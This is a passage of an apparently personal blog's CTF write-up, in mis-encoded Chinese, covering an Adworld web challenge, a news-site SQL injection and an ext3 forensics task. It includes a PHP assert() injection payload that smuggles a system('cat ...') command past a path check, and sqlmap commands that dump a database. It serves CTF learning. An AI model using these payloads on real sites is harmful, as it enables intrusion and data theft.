class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Šæ„é€ å¥½çš„payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>æŠŠæˆ‘ä»¬çš„payloadä»£å…¥è¿›å»:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯, <code>//</code>åœ¨è¿™é‡Œèµ·åˆ°äº†æ³¨é‡Šçš„ä½œç”¨, ä½†æ˜¯åªæ³¨é‡Šåˆ°assertçš„æ‹¬å·å†….<br>æ‰€ä»¥è¿™æ¡è¯­å¥å°±æˆäº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>å†æŠŠ<code>assert()</code>å»é™¤æ‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡è¯­å¥ç”±ä¸‰ä¸ªå°è¯­å¥ç»„æˆ, å¹¶ç”¨<code>or</code>è¿æ¥äº†èµ·æ¥, ä¾æ­¤ç¼–å· 1 2 3.<br>é‚£ä¹ˆ, ä¸ºäº†å¾—åˆ°flag, æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ<code>è¯­å¥2</code>,è€Œä¸å¸Œæœ›æ‰§è¡Œå…¶å®ƒè¯­å¥.<br>æ‰€ä»¥è¿™é‡Œå…¶å®æ˜¯åˆ©ç”¨äº†<code>or</code>çš„<code>çŸ­è·¯æ•ˆåº”</code>.</p>
<ul>
<li><code>è¯­å¥1</code> : <code>strpos()</code>å‡½æ•°ä¸ºæŸ¥æ‰¾å­—ä¸², ä½†æ˜¯æ˜¾ç„¶<code>templates/flag.php</code>ä¸­æ²¡æœ‰<code>yjn</code>è¿™ä¸ªå­ä¸², æ‰€ä»¥ä¼šæœ‰ä¸ªè¿”å›å€¼0. <code>or</code>ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œ.</li>
<li><code>è¯­å¥2</code> : ä½¿ç³»ç»Ÿæ‰§è¡Œå‘½ä»¤<code>cat ./templates/flag.php</code>, è¿™æ¡å‘½ä»¤ä¸å…‰ä¼šè®©æˆ‘ä»¬æˆåŠŸçš„æ‹¿åˆ°äº†flag, è¿˜ä¼šè¿”å›<code>TRUE</code>, <code>or</code>å°±ä¸ä¼šæ‰§è¡Œ<code>è¯­å¥3</code>. å¦‚æœå‘½ä»¤æ‰§è¡Œä¸æˆåŠŸ, ä¹Ÿä¼šæœ‰ä¸ª<code>FLASE</code>çš„è¿”å›å€¼, è¿™æ›¾ä¸€åº¦ç»™æˆ‘å¾ˆå¤§çš„å›°æ‰°.</li>
</ul>
<p>æœ€ç»ˆ<br><img src="http://whoisyourdaddy.cf/picture/mfw.png" alt></p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></p>
<p>è¿›å…¥é¢˜ç›®æ˜¯ä¸ªç±»ä¼¼æ–°é—»ç½‘ç«™çš„é¡µé¢, ä¸‹é¢æœ‰ä¸ªæœç´¢æ¡†.<br>å¯ä»¥sqlæ³¨å…¥.<br>ä½†æ˜¯æˆ‘ç°åœ¨çš„sqlæ³¨å…¥æŠ€æœ¯è¿˜æ˜¯èœå•Š, æ‰€ä»¥å°±ç”¨<code>sqlmap</code>å§, è®°å½•ä¸‹~</p>
<p>å› ä¸º<code>sqlmap</code>è¦æ±‚<code>python2</code>è¿è¡Œ, æ‰€ä»¥æˆ‘è¿™é‡Œæ˜¯ç”¨çš„<code>Kali</code>ä¸‹è‡ªå¸¦çš„</p>
<p>é¦–å…ˆæŠŠæœç´¢çš„è¯·æ±‚åŒ…æŠ“å–, å°†å…¶å†…å®¹æ”¾è¿›ä¸€ä¸ª<code>txt</code>æ–‡ä»¶ä¸­</p>
<p>ä½¿ç”¨å‘½ä»¤<code>sqlmap   -r 1.txt --dbs</code><br>å¯ä»¥å°†è¡¨çš„åå­—åˆ—å‡º, å‘ç°æœ‰ä¸ª<code>news</code><br>å†ä½¿ç”¨å‘½ä»¤<code>sqlmap   -r 1.txt -D news --dump</code><br>å°±èƒ½å°†è¿™ä¸ªè¡¨çš„å†…å®¹å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥<br>get flag~</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
<li>é‡ç‚¹ :<ul>
<li>ext3 æ–‡ä»¶ç³»ç»Ÿ</li>
<li>strings</li>
<li>æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½/å¸è½½</li>
</ul>
</li>
</ul>
<p>é™„ä»¶æ˜¯ä¸ªåä¸º<code>linux</code>çš„æ–‡ä»¶,<br>æ‰”è¿› Linux é‡Œ,<code>file linux</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºæ˜¯Linuxæ–‡ä»¶ç³»ç»Ÿ<code>ext3</code>, æˆ‘ä»¬è¦æ‰¾çš„<code>flag</code>åº”è¯¥å°±è—åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¦è¯»å–è¿™ä¸ª<code>flag.txt</code>,éœ€è¦æˆ‘ä»¬æŠŠæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°Linuxç³»ç»Ÿä¸‹.<br><code>mount linux /mnt</code><br>ç°åœ¨ <code>/mnt</code>ç›®å½•å°±æ˜¯æŒ‚è½½ç‚¹.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>

<p><code>base64</code> decodeåå°±æ˜¯flag<br>æœ€åå¯ä»¥ä½¿ç”¨ <code>umount [æŒ‚è½½ç‚¹]</code>æ¥å¸è½½æ–‡ä»¶ç³»ç»Ÿ.</p>
<hr>
<center><font size="2" color="grey">æœ€åä¿®æ”¹äº 2019/6/28   

<p>å¤©æ´¥å¤§å­¦-æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨-å°¤å˜‰å® </p>
</font></center>
    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    â€œå¤©æ´¥å¤§å­¦ æ™ºèƒ½ä¸è®¡ç®—å­¦éƒ¨ å°¤å˜‰å®â€
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/07/07/CTF-writeup/">CTF writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/07/07/just-a-test/">just a test</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/07/07/hello-world/">Hello World</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @å°¤å˜‰å®. All right reserved 
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>